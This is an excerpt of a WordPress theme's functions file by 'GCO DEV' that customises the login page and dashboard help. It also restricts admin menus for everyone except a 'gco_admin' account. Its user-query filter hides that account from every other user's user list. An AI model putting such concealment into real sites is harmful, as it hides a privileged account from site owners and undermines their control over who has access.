...
function sh_login_logo() {
	...
	if( ! $sh_option['btn-hidden-info'] ) {
		wp_enqueue_style( 'login-custom-style', get_template_directory_uri() .'/assets/css/login.css' );
	}
}
...
function custom_dashboard_help() {
	...
	Hệ thống được phát triển bởi <strong>GCO DEV</strong> trên nền tảng <strong>Wordpress</strong>.<br />
...
/**
 * Hide Menu Page If User Not gco_admin
**/
function remove_menus() {
	global $current_user, $sh_option;
	$username = $current_user->user_login;
	if( $sh_option['btn-restrict-user'] && ( $username != 'gco_admin' ) ) {
...
function yoursite_pre_user_query($user_search) {
	global $current_user;
	$username = $current_user->user_login;
	if ( $username != 'gco_admin' ) {
		global $wpdb;
		$user_search->query_where = str_replace('WHERE 1=1',
		"WHERE 1=1 AND {$wpdb->users}.user_login != 'gco_admin'",$user_search->query_where);
	}
}
